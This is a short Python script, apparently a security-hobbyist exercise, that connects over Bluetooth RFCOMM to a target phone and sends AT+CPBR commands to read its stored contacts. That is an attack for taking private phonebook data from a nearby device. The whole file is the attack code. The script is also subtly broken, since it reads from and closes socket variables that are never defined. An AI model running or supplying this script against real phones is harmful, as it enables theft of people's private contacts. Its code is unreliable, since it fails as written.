"""
Description: Using python we craft bluetooth requests to list cellphone contacts.
Author: Aleksa Zatezalo
Date: June 23, 2023
"""

import bluetooth
tgtPhone = "AA:BB:CC:DD:EE:FF"
port = 17
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))

for contact in range(1,5):
    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print('[+] ' + str(contact) + ": " + result)
sock.close()